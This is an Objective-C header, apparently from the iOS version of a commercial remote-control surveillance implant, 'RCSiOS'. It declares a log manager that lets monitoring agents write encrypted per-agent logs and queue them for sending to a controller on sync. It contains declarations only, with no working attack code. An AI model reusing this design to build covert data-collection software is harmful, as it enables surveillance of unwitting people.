/*
 * RCSiOS - Log Manager
 *  Logging facilities, this class is a singleton which will be referenced
 *  by RCSMCommunicationManager and all the single agents providing ways for
 *  writing log data per agentID.
 *
 * 
 * Created on 16/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSILogManager_h__
#define __RCSILogManager_h__

#import "RCSIGlobals.h"
#import "RCSICommon.h"
#import "RCSIEncryption.h"
#import "NSMutableData+AES128.h"

@class _i_Encryption;

//
// Basically there are 2 possible queues:
// - Active, all the logs currently opened are stored here
// - Send, all the closed logs ready to be sent are stored here
// On Sync we close all the logs and switch them in the Send queue so that
// they can all be sent
// NOTE: The Switch operation is transparent for all the agents, they will just
//       keep calling writeDataToLog(), switchLogsBetweenQueues() will also recreate
//       a new empty log inside the kActiveQueue for all the agents that were there
//
enum {
  kActiveQueue = 2,
  kSendQueue   = 1,
};

@interface _i_syncLogSet : NSObject
{
  NSString *mLogSetName;
  NSString *mLogSetPath;
  BOOL      isRemovable;
}

@property (retain) NSString *mLogSetName;
@property (retain) NSString *mLogSetPath;
@property (readwrite) BOOL      isRemovable;

@end

@interface _i_Log : NSObject
{
  NSString *mLogPath;
  NSString *mLogName;
  NSString *mSendableLogPath;
  NSString *mSendableLogName;
  NSNumber *mAgentId;
  NSNumber *mLogId;
  NSFileHandle *mLogFileHandle;
}
@property (retain) NSNumber *mAgentId;
@property (retain) NSNumber *mLogId;
@property (retain) NSFileHandle *mLogFileHandle;

- (id)initWithAgentId:(int)agentId andLogId:(int)logId;
- (void)closeLogFileHandle;
- (BOOL)setSendable:(NSString*)logSetPathName;
- (void)release;

@end

@interface _i_LogSet : NSObject
{
  NSString *mLogSetFolderName;
  NSString *mLogSetFolderPath;
  int mLogCount;
  NSMutableArray *mLogsArray;
  _i_Encryption *mEncryption;
}

@property (retain) NSString *mLogSetFolderName;

- (id)initWithEncryption:(_i_Encryption*)encryption;
- (void)release;

- (void)setupLogSetFolderName;
- (BOOL)createLogSetFolder;

- (int)addLogWithAgentId:(int)agentId andLogId:(int)logId;
- (BOOL)delLogWithAgentId:(int)agentId andLogId:(int)logId;
- (BOOL)appendLogData:(NSData*)data forAgentId:(int)agentId andLogId:(int)logId;
- (void)closeLogSetLogs;
- (int)logsCount;

@end

@interface _i_LogManager : NSObject
{
  NSMutableArray  *mLogSetArray;
  _i_Encryption   *mEncryption;
  _i_LogSet       *mCurrLogSet;
  
  NSMutableArray *mLogMessageQueue;
  NSMachPort     *notificationPort;
}

@property (readonly) NSMachPort *notificationPort;

+ (_i_LogManager *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)init;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (BOOL)createLog: (u_int)agentID
      agentHeader: (NSData *)anAgentHeader
        withLogID: (u_int)logID;

- (BOOL)writeDataToLog: (NSMutableData *)aData
              forAgent: (u_int)agentID
             withLogID: (u_int)logID;

- (BOOL)closeActiveLog: (u_int)agentID
             withLogID: (u_int)logID;

- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging;

- (NSMutableArray*)syncableLogSetArray;

- (BOOL)addMessage: (NSData*)aMessage;

- (void)start;

@end

//
// A Log Entry (NSMutableDictionary) contained in queues is composed of:
//  - agentID
//  - logID
//  - logName
//  - handle

//@interface _i_LogManager : NSObject
//{
//@private
//  NSMutableArray *mActiveQueue;
//  
//  NSMutableArray *mNoAutoQueuedLogs;
//  NSMutableArray *mAutoQueuedLogs;
//  
//  NSMutableArray *mSendQueue;
//  
//  NSMutableArray *mLogMessageQueue;
//  NSMachPort     *notificationPort;
//  NSString       *mCurrLogFolder;
//  
//@private
//  _i_Encryption *mEncryption;
//}
//
//@property (readonly) NSMachPort *notificationPort;
//@property (readwrite, retain) NSString *mCurrLogFolder;
//
//+ (_i_LogManager *)sharedInstance;
//+ (id)allocWithZone: (NSZone *)aZone;
//- (id)copyWithZone: (NSZone *)aZone;
//- (id)init;
//- (id)retain;
//- (unsigned)retainCount;
//- (void)release;
//- (id)autorelease;
//
//- (NSMutableArray*)getLogQueue: (u_int)agentID andLogID:(u_int)logID;
//
//- (NSData *)createLogHeader: (u_int)agentID
//                  timestamp: (int64_t)fileTime
//                agentHeader: (NSData *)anAgentHeader;
//                 
//
//- (BOOL)createLog: (u_int)agentID
//      agentHeader: (NSData *)anAgentHeader
//        withLogID: (u_int)logID;
//
//- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging;
//
//- (BOOL)closeActiveLog: (u_int)agentID
//             withLogID: (u_int)logID;
//
//- (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle;
//
//- (BOOL)writeDataToLog: (NSMutableData *)aData 
//              forAgent: (u_int)agentID
//             withLogID: (u_int)logID;
//
//- (int)getSendLogItemCount;
//- (id)getSendLogItemAtIndex:(int)theIndex;
//
//- (BOOL)clearSendLogQueue: (NSMutableIndexSet *)theSet;
//
//- (BOOL)addMessage: (NSData*)aMessage;
//
//- (NSString*)createAndGetCurrLogsFolder;
//
//- (void)start;
//@end

#endif







